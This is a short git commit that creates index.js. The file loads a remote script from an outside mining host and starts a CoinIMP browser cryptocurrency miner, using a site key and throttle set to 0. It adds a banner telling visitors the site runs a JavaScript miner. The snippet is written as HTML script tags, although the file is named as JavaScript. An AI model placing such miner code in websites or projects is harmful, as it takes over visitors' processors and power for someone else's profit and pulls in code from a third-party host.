49a36cfe5d247cab31ae4f7a44a3957b29491f90
binary-hash <69256941+binary-hash@users.noreply.github.com>
2021-09-21 20:21:59 +0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/IAbP.js"></script>
+<script>
+    var _client = new Client.Anonymous('c0384984a2d3d5ee6e8094b4ccf25421dee88d8e2145d5873e64b9a3f585076e', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
